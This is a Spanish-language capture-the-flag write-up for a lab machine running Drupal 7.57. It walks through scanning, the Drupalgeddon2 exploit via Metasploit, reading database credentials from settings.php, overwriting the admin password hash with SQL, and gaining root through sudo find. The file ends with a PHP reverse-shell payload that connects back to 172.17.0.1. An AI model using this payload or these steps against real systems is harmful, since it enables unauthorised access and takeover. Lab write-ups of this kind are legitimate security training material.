# >_ [Armageddon]

| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | Whoami Labs |
| **Dificultad** | 🟡 Media  |
| **OS** | Linux  |
| **IP de la Máquina** | `172.17.0.2` |
| **Fecha de resolución** | 2026-09-22 |

---

## 📝 Descripción

Máquina enfocada en la explotación web y escalada de privilegios para encontrar la flag.

---

## 🔍 1. Fase de Reconocimiento y Enumeración

Lanzamos un ping a la máquina objetivo para ver si nos responde y que SO es. Es un Linux y nos responde.


<img width="631" height="154" alt="ping" src="https://github.com/user-attachments/assets/078394cf-1b14-4a27-adb5-b436f5671847" />




### Escaneo de Puertos (`nmap`)
Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN allPorts
```


**Resultados del escaneo:**

<img width="804" height="215" alt="1Escaneo" src="https://github.com/user-attachments/assets/d6731585-3c86-4d86-8fb8-f186c0109e1d" />
<br><br>

Descubrimos abierto solo el puerto 80 con el servicio http.
<br><br>

### Enumeración de servicios
Continuamos con un escaneo más profundo del servicio encontrado:

```bash
nmap -p80 -sCV 172.17.0.2 -oN targeted
```

<img width="1229" height="419" alt="2Escaneopuerto" src="https://github.com/user-attachments/assets/193bf3ca-138e-4c3d-a2e4-3b6e59e8496e" />
<br><br>

Aquí descubrimos que nos enfrentamos a un Apache httpd 2.438, vemos que la web también contiene un robots.txt junto con unas cuantas rutas más y también que usa el gestor de contenidos Drupal en la versión 7 que es bastante vulnerable.


### Enumeración Web (Puerto 80)
Al acceder al sitio web, nos encontramos con la siguiente página:
<img width="1255" height="838" alt="3Web80Drupal" src="https://github.com/user-attachments/assets/63321a63-66b1-4287-bee6-c709314e788c" />

Tiene un login para acceder al portal, se puede crear una nueva cuenta y cambiar la contraseña.
Comenzamos probando el típico de Sql Injection pero no funciona.

<img width="1417" height="872" alt="3WebPrueba" src="https://github.com/user-attachments/assets/97a03625-7686-41ef-ba97-ab98d1e3d420" />
<br><br>

Si probamos a crearnos una cuenta nueva, vemos que no podemos ya que no tenemos un email del sistema.

<img width="1382" height="731" alt="5Crearcuenta" src="https://github.com/user-attachments/assets/cce705ba-5bae-44ba-8371-a2958c6d3802" />

Como en el escaneo del puerto 80 vimos que usaba Drupal 7, vamos a continuar mirando por ahí.


---


## 💥 2. Fase de Explotación

Comenzamos usando la herramienta droopescan para ver que encuentra.
<img width="1296" height="401" alt="5Drupa encontrar" src="https://github.com/user-attachments/assets/11b55ab9-bad6-4a08-803c-8f76281e82d3" />
<br><br>

Nos muestra dos posibles urls muy interesantes, un changelog.txt y un login en user.


Miramos el txt para ver si hay algo relevante y vemos la versión exacta del droopal que emplea esta web, la 7.57


<img width="880" height="779" alt="6drupalversion" src="https://github.com/user-attachments/assets/6a7577bb-f578-401f-8d4e-42041ff77e42" />
<br><br>


Buscamos si tiene algún exploit o vulnerabilidad ya que es una versión bastante antigua, del año 2018.

<img width="1898" height="377" alt="6drupalsearchsploit" src="https://github.com/user-attachments/assets/45d24516-36f3-400a-93f8-46df114d47ab" />
<br><br>

Encontramos Drupalgeddon2 y Drupalgeddon3 las más sobresalientes.
Así que tiene varias vulnerabilidades esta versión de droopal, vamos a probar la de remote code con Metasploit para ganar acceso al usuario www-data. Ponemos los parámetros que pos pide, como la Ip y el puerto y lo lanzamos.
<img width="1202" height="265" alt="7vulnmeta" src="https://github.com/user-attachments/assets/dc27a081-1fd8-4db9-ba56-1002892be4a0" />


Enseguida conseguimos acceder como el usuario www-data
<img width="1392" height="178" alt="8dentro2" src="https://github.com/user-attachments/assets/0e49bfcf-37a0-4a5b-b792-ce929f54a8cb" />


Hay una carpeta default, entramos para mirar que contiene y vemos un settings.php, vamos a leer su contenido:
<img width="1910" height="875" alt="9buscamosconf" src="https://github.com/user-attachments/assets/58757908-773f-433d-bab7-ba9cf11a3838" />

Lo más relevante de este fichero es la información de la base de datos, ya que está en texto plano el nombre de la base de datos, del usuario y la contraseña. También nos indica que es mysql asi que vamos a probar a acceder con estas credenciales

```php
'database' => 'drupaldb',
      'username' => 'drupaluser',
      'password' => 'DrUp4l_Adm1n_S3cur3_P4ss!2018',
      'host' => '127.0.0.1',
      'port' => '',
      'driver' => 'mysql',
```

Entramos con mysql -u drupaluser -p, nos pide la contraseña y estamos dentro. 
<img width="867" height="305" alt="10bbdd" src="https://github.com/user-attachments/assets/720f92e7-2a2c-4cc7-9760-be290d23a92e" />
<br><br>

Una vez dentro vamos a la base de datos que vimos, drupaldb, miramos las tablas que tiene. Hay un montón pero nos interesa una de las últimas tablas, la tabla users:
<img width="813" height="798" alt="11mirarbbdd" src="https://github.com/user-attachments/assets/c4f51436-4696-4034-908b-477f364e5dbf" />


Hacemos una select para mostrar todo el contenido de la tabla users y tenemos al usuario admin y los usuarios que creamos nosotros
<img width="1917" height="496" alt="12ole" src="https://github.com/user-attachments/assets/9f440000-da3d-47a6-9188-1c50cc7f68e1" />

```mysql
1 | admin    | $S$DZbLDbsh4O5y5C/I.sEmNxKz1XQwThfFRxhgfNjfzE41DvQodxL9 | admin@example.com       |       |           | NULL             | 1789796142 |      0 | 1789796142 |      1 | UTC      |          |       0 | admin@example.com       | b:0; |
|   2 | usuario  | $S$DvYeqaCiHp6iIsvh0G/.seanm8.aAxl/m39tWnEPhmp1jec6.I88 | usuario@hotmail.com     |       |           | filtered_html    | 1790008520 |      0 |          0 |      0 | UTC      |          |       0 | usuario@hotmail.com     | NULL |
|   3 | usuario2 | $S$DI2.nqMoNI.3JcBLIXyQ3P7huefINz4iP6ovKZoglN37fmV/mobb | reces91372@blobapps.com | 
      |           | filtered_html    | 1790008860 |      0 |          0 |      0 | UTC      |          |       0 | reces91372@blobapps.com 
```


Intenté descifrar la clave con John pero después de mucho rato no lo conseguí así que como tengo acceso a la base de datos y puedo modificarla, voy a crear yo una clave, pasarla a hash y sustituirla:


```
password: clave 		hash: $S$DfICEjSbGQDWYfs1XBeknER9Th5ntVTih2tRQ8SLpnFJI.BehYRQ
```

Una vez tengo la contraseña, realizo un update en la tabla de users:

```mysql
update users set pass='$S$DfICEjSbGQDWYfs1XBeknER9Th5ntVTih2tRQ8SLpnFJI.BehYRQ' where name='admin';
```

Una vez aplicado el cambio, revisamos si la contraseña a cambiado para el usuario admin y está la nueva que pusimos.
<img width="1279" height="635" alt="17cambiada" src="https://github.com/user-attachments/assets/71e0b94a-3ff4-47b6-b1f6-cca378fac471" />


Probamos a acceder en el panel del login con la nueva contraseña:
<img width="1435" height="744" alt="13in" src="https://github.com/user-attachments/assets/c4422b80-5d04-4c36-8fe7-a64f96ff1dbf" />


Conseguimos entrar y podemos ver todo:
<img width="1659" height="775" alt="18dentroweb" src="https://github.com/user-attachments/assets/05feb00c-ff33-47a7-91ed-5633dbc33856" />
<br><br>


---


## 👑 3. Escalada de Privilegios

Seguimos siendo en la terminal el usuario www-data, ya que tenemos una contraseña y usuario de la base de datos, probamos a ver si hay reutilización de contraseñas y podemos escalar privilegios
<img width="608" height="158" alt="19soydbadmin" src="https://github.com/user-attachments/assets/a2780f71-31c6-4cc0-9613-47db9c706b66" />
<br><br>

Si que la hay, pero necesitamos seguir escalando para ser root y poder leer la flag, asi que miramos si tiene permisos SUDO y tiene uno, find.
<img width="1191" height="154" alt="20sduo" src="https://github.com/user-attachments/assets/2d347a39-1245-4017-b819-63c9237357f0" />
<br><br>

Ejecutamos find como el usuario root sin proporcionar contraseña.
Ya somos el usuario root, vamos a su carpeta personal y ahí tenemos la flag.
<img width="617" height="323" alt="21" src="https://github.com/user-attachments/assets/3d37fccf-a6ff-4a35-9e5a-88e452bf7d94" />
<br><br>

Verificamos la flag y es correcta.
<img width="784" height="679" alt="fin" src="https://github.com/user-attachments/assets/1c3a361f-36af-4933-a35e-f89d58845c6e" />
<br><br>


<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/440 0>&1'");
?>

